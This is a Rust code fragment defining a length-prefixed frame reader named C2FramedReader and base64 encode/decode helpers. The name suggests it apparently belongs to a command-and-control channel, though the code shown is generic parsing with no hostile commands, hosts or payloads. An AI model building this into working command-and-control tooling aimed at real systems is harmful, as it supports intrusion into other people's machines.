impl C2FramedReader {
    fn new() -> Self {
        Self {
            buf: Vec::with_capacity(8192),
            pos: 0,
        }
    }

    fn put_slice(&mut self, data: &[u8]) {
        self.buf.extend_from_slice(data);
    }

    fn get_frame(&mut self) -> Option<Vec<u8>> {
        if self.buf.len() < self.pos + 4 {
            return None;
        }
        let len = u32::from_be_bytes(
            self.buf[self.pos..self.pos + 4].try_into().unwrap()
        ) as usize;

        if self.buf.len() < self.pos + 4 + len {
            return None;
        }

        self.pos += 4;
        let frame = self.buf[self.pos..self.pos + len].to_vec();
        self.pos += len;

        // Compact buffer
        if self.pos > 0 && self.pos >= self.buf.len() {
            self.buf.clear();
            self.pos = 0;
        } else if self.pos > 0 {
            self.buf.drain(..self.pos);
            self.pos = 0;
        }

        Some(frame)
    }
}

/// Helper: base64 decode
fn base64_decode(input: &str) -> Result<Vec<u8>, base64::DecodeError> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.decode(input)
}

/// Helper: base64 encode
fn base64_encode(data: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(data)
}
